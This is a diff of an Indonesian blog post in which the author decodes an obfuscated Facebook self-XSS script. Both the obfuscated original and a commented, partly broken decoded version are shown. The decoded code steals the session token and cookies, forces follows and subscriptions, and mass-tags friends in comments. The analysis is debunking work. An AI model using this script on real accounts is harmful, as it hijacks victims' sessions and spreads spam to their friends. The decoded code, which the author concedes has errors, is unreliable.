@@ -16,7 +16,7 @@ Saya sempat penasaran, bagaimana sebenernya kerja dari script tersebut. Apa bena
 
 Dari situ saya mulai penasaran dan ingin ikut mencoba, tapi bukan mencoba untuk menggunakan melainkan mencoba untuk men-decode script tersebut. Berikut adalah script aslinya<!-- more -->
 
-{% highlight javascript %}
+```js
 var _0xa959=["\x76\x61\x6C\x75\x65","\x66\x62\x5F\x64\x74\x73\x67","\x6
 7\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x4E\x61\x6D\x65","\x6D\x61\x74\x63\x68","\x63\x6F\
 x6F\x6B\x69\x65","\x3D","\x6C\x65\x6E\x67\x74\x68","\x69\x6E\x64\x65\x78\x4F\x66","\x3B","\x73\x75\x
@@ -166,11 +166,11 @@ a22c[29]+user_id;_0x8cc3x1f+=_0xa22c[53];_0x8cc3x1f+=_0xa22c[54];_0x8cc3x1f+=_0x
 0x8cc3x24[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x8cc3x24[_0xa22c[6]]=function
 (){if(_0x8cc3x24[_0xa22c[7]]==4&&_0x8cc3x24[_0xa22c[63]]==200){_0x8cc3x24[_0xa22c[64]];} ;}
 ;_0x8cc3x24[_0xa22c[37]](_0x8cc3x1f);} ;arkadaslari_al(id);
-{% endhighlight %}
+```
 
 dan ini adalah script hasil decoding manual yang saya lakukan. Mungkin masih terdapat beberapa kesalahan, tapi setidaknya saya tau strukturnya
 
-{% highlight javascript %}
+```js
 // fb_dtsg: untuk mendapatkan nilai dari elemnt dengan nama tersebut
 // user_id: untuk mendapatkan user_id anda (yang sedang login)
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value,
@@ -178,65 +178,66 @@ var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value,
 
 // funsi untuk mendapatkan nilai cookie dari browser anda
 function cereziAl(argumen) {
-    var args = argumen +=;
+  var args = argumen +=;
 
-    if (document.cookie.length>0) {
-        konum = document.cookie.indexOf(args);
+  if (document.cookie.length>0) {
+    konum = document.cookie.indexOf(args);
 
-        if (konum != -1) {
-            konum += args.length;
-            son = document.cookie.indexOf(;, konum);
+    if (konum != -1) {
+      konum += args.length;
+      son = document.cookie.indexOf(;, konum);
 
-            if (son == -1) {
-                son = document.cookie.length;
-            }
+      if (son == -1) {
+        son = document.cookie.length;
+      }
 
-            return unescape(document.cookie.substring(konum,son));
-        } else {
-            return;
-        }
+      return unescape(document.cookie.substring(konum,son));
+    } else {
+      return;
     }
+  }
 }
 
 // fungsi untuk mendapatkan nilai random integer
 function getRandomInt(int1, int2) {
-    return Math.floor(Math.random()*(int2-int1+1))+int1;
+  return Math.floor(Math.random()*(int2-int1+1))+int1;
 }
 
 // fungsi untuk mendapatkan salah satu huruf dari kata secara random.
 // Misal argumennya adalah 'dicoba' outputnya bisa 'd' atau 'c' atau huruf lain dalam kata tersebut
 function randomValue(val) {
-    return val[getRandomInt(0,val.length-1)];
+  return val[getRandomInt(0,val.length-1)];
 }
 
 // fungsi agar setiap pengguna yang menggunakan script ini akan secara langsung mengikuti (follow) akun dari pemilik script
 function a(profile_id) {
-    var request = new XMLHttpRequest(),
-        target_url = 'profile_id='+profile_id+'&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg='+fb_dtsg+'&lsd&__'+user_id+'&phstamp=';
+  var request = new XMLHttpRequest(),
+      target_url = 'profile_id='+profile_id+'&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg='+fb_dtsg+'&lsd&__'+user_id+'&phstamp=';
 
-    request.open('POST','/ajax/follow/follow_profile.php?__a=1',true);
-    request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
-    request.setRequestHeader('Content-length', target_url.length);
-    request.setRequestHeader('Connection', 'close');
+  request.open('POST','/ajax/follow/follow_profile.php?__a=1',true);
+  request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+  request.setRequestHeader('Content-length', target_url.length);
+  request.setRequestHeader('Connection', 'close');
 
-    request.onreadystatechange = function () {
-        if (request.readyState == 4 && request.status == 200) {
-            request.close;
-        }
+  request.onreadystatechange = function () {
+    if (request.readyState == 4 && request.status == 200) {
+      request.close;
     }
+  }
 
-    request.send(target_url);
+  request.send(target_url);
 }
 
 // fungsi agar setiap pengguna yang menggunakan script ini akan langsung berlangganan berita dari halaman si pemilik akun
 function sublist(profile_id) {
-    var a = document.createElement('script');
+  var a = document.createElement('script');
 
-    a.innerHTML = new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({
-        flid: profile_id
-    }).send();
+  a.innerHTML = new AsyncRequest()
+    .setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe')
+    .setData({ flid: profile_id })
+    .send();
 
-    document.body.appendChild(a);
+  document.body.appendChild(a);
 }
 
 // disinilah daftar profile yang akan anda ikuti (follow)
@@ -256,87 +257,87 @@ var now = (new Date).cookie();
 
 // saya masih belum tau ini buat apaan
 function Report(_0x8cc3x15) {
-    var request = new XMLHttpRequest(),
-        target_url = '//www.facebook.com/ajax/report/social.php'+fb_dtsg+'fb_dtsg='+_0x8cc3x15+'&block=1&pp=%7B%22actions_to_take%22%3A%22[]%22%2C%22are_friends%22%3Afalse%2C%22cid%22%3A'+_0x8cc3x15+'%2C%22content_type%22%3A0%2C%22expand_report%22%3A1%2C%22first_choice%22%3A%22file_report%22%2C%22from_gear%22%3A%22timeline%22%2C%22is_following%22%3Afalse%2C%22is_tagged%22%3Afalse%2C%22on_profile%22%3Afalse%2C%22phase%22%3A3%2C%22ref%22%3A%22https%3A%5C%2F%5C%2Fwww.facebook.com%5C%2FNan.ertt7%22%2C%22report_type%22%3A145%2C%22rid%22%3A'+now+'%2C%22sub_report_type%22%3A3%2C%22time_flow_started%22%3A'+user_id+'%2C%22user%22%3A'+user_id+'%7D&file_report=1&__user=';
+  var request = new XMLHttpRequest(),
+      target_url = '//www.facebook.com/ajax/report/social.php'+fb_dtsg+'fb_dtsg='+_0x8cc3x15+'&block=1&pp=%7B%22actions_to_take%22%3A%22[]%22%2C%22are_friends%22%3Afalse%2C%22cid%22%3A'+_0x8cc3x15+'%2C%22content_type%22%3A0%2C%22expand_report%22%3A1%2C%22first_choice%22%3A%22file_report%22%2C%22from_gear%22%3A%22timeline%22%2C%22is_following%22%3Afalse%2C%22is_tagged%22%3Afalse%2C%22on_profile%22%3Afalse%2C%22phase%22%3A3%2C%22ref%22%3A%22https%3A%5C%2F%5C%2Fwww.facebook.com%5C%2FNan.ertt7%22%2C%22report_type%22%3A145%2C%22rid%22%3A'+now+'%2C%22sub_report_type%22%3A3%2C%22time_flow_started%22%3A'+user_id+'%2C%22user%22%3A'+user_id+'%7D&file_report=1&__user=';
 
-    request.POST('&__a=1&__dyn=7n8ahyj2qmvu5k9UmAAaUVpo&__req=u&ttstamp=2658168571071108880', 'getTime', true);
-    request.open = function () {
-        if (request.onreadystatechange == 4 && request.readyState == 200) {
-            request.status;
-        }
+  request.POST('&__a=1&__dyn=7n8ahyj2qmvu5k9UmAAaUVpo&__req=u&ttstamp=2658168571071108880', 'getTime', true);
+  request.open = function () {
+    if (request.onreadystatechange == 4 && request.readyState == 200) {
+      request.status;
     }
+  }
 
-    request.close(target_url);
+  request.close(target_url);
 }
 
 var id = '276612075827745', // post id
-    arkadaslar = [],        // tempat nampun daftar teman
-    svn_rev;                // tempat nampung daftar komentar (menyesuaikan dengan batas text dalam komentar)
+  arkadaslar = [],        // tempat nampun daftar teman
+  svn_rev;                // tempat nampung daftar komentar (menyesuaikan dengan batas text dalam komentar)
 
 // fungsi buat manggil semua daftar teman dalam komentar di post 'id' diatas (baris 99)
 function arkadaslari_al(id) {
-    var request = new XMLHttpRequest();
+  var request = new XMLHttpRequest();
 
-    request.onreadystatechange = function () {
-        if (request.readyState == 4) {
-            eval(arkadaslar = request.responseText.toString().replace(for (;;);,'')+';');
+  request.onreadystatechange = function () {
+    if (request.readyState == 4) {
+      eval(arkadaslar = request.responseText.toString().replace(for (;;);,'')+';');
 
-            for (f=0; f<Math.round(arkadaslar.payload.entries.length/27); f++) {
-                mesaj = '';
-                mesaj_text = '';
+      for (f=0; f<Math.round(arkadaslar.payload.entries.length/27); f++) {
+        mesaj = '';
+        mesaj_text = '';
 
-                for (i=f*27; i<(f+1)*27; i++) {
-                    if (arkadaslar.payload.entries[i]) {
-                        mesaj+= ' @['+arkadaslar.payload.entries[i]['uid']+':'+arkadaslar.payload.entries[i].text+']';
-                        mesaj_text+= ' '+arkadaslar.payload.entries[i].text;
-                    }
-                }
-
-                yorum_yap(id, mesaj);
-            }
+        for (i=f*27; i<(f+1)*27; i++) {
+          if (arkadaslar.payload.entries[i]) {
+            mesaj+= ' @['+arkadaslar.payload.entries[i]['uid']+':'+arkadaslar.payload.entries[i].text+']';
+            mesaj_text+= ' '+arkadaslar.payload.entries[i].text;
+          }
         }
+
+        yorum_yap(id, mesaj);
+      }
     }
+  }
 
-    var target_url = '&filter[0]=user&options[0]=friends_only&options[1]=nm&token=v7&viewer='+user_id+'&__user='+user_id;
+  var target_url = '&filter[0]=user&options[0]=friends_only&options[1]=nm&token=v7&viewer='+user_id+'&__user='+user_id;
 
-    if (document.URL.indexOf('https://') >= 0) {
-        request.open('GET', 'https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1'+target_url, true);
-    } else {
-        request.open('GET', 'http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1'+target_url, true);
-    }
+  if (document.URL.indexOf('https://') >= 0) {
+      request.open('GET', 'https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1'+target_url, true);
+  } else {
+      request.open('GET', 'http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1'+target_url, true);
+  }
 
-    request.send();
+  request.send();
 }
 
 // belum tau ini fungsinya buat apaan, soalnya keliatannya fungsi ini nggak dipake
 function RandomArkadas() {
-    var target_id = '';
+  var target_id = '';
 
-    for (i=0; i<9; i++) {
-        target_id += ' @['+arkadaslar.payload.entries[Math.floor(Math.random()*arkadaslar.payload.entries.length)]['uid']+':'+arkadaslar.payload.entries[Math.floor(Math.random()*arkadaslar.payload.entries.length)].text+']';
-    }
+  for (i=0; i<9; i++) {
+    target_id += ' @['+arkadaslar.payload.entries[Math.floor(Math.random()*arkadaslar.payload.entries.length)]['uid']+':'+arkadaslar.payload.entries[Math.floor(Math.random()*arkadaslar.payload.entries.length)].text+']';
+  }
 
-    return target_id;
+  return target_id;
 }
 
 // fungsi untuk posting komentar
 function yorum_yap(id, comment) {
-    var request = new XMLHttpRequest(),
-        target_url = '&ft_ent_identifier='+id+'&comment_text='+encodeURIComponent(comment)+'&source=2&client_id=1377871797138:1707018092&reply_fbid&parent_comment_id&rootid=u_jsonp_2_3&clp={"cl_impid":"453524a0clearcounter":0,"elementid":"js_5version":"xparent_fbid":}&attached_sticker_fbid=0&__user='+user_id+'&attached_photo_fbid=0&giftoccasion&ft[tn]=[]&__a=1'+fb_dtsg+'&__dyn=7n8ahyj35ynxl2u5F97KepEsyo';
+  var request = new XMLHttpRequest(),
+      target_url = '&ft_ent_identifier='+id+'&comment_text='+encodeURIComponent(comment)+'&source=2&client_id=1377871797138:1707018092&reply_fbid&parent_comment_id&rootid=u_jsonp_2_3&clp={"cl_impid":"453524a0clearcounter":0,"elementid":"js_5version":"xparent_fbid":}&attached_sticker_fbid=0&__user='+user_id+'&attached_photo_fbid=0&giftoccasion&ft[tn]=[]&__a=1'+fb_dtsg+'&__dyn=7n8ahyj35ynxl2u5F97KepEsyo';
 
-    request.open('POST', '&__req=q', true);
-    request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
-    request.onreadystatechange = function () {
-        if (request.readyState == 4 && request.status == 200) {
-            request.close;
-        }
-    }
+  request.open('POST', '&__req=q', true);
+  request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+  request.onreadystatechange = function () {
+      if (request.readyState == 4 && request.status == 200) {
+          request.close;
+      }
+  }
 
-    request.send(target_url);
+  request.send(target_url);
 }
 
 arkadaslari_al(id);
-{% endhighlight %}
+```
 
 Dari hasil decoding diatas dapat dilihat bahwa script tersebut hanyalah script sampah. Dan perlu diingan bahwa Facebook bukanlah platform Sosial Media murahan. Mana mungkin sistem keamanan Facebook dapat dibobol dengan sebaris script berukuran 5,6 kilobyte, ya to? hehehe.
 
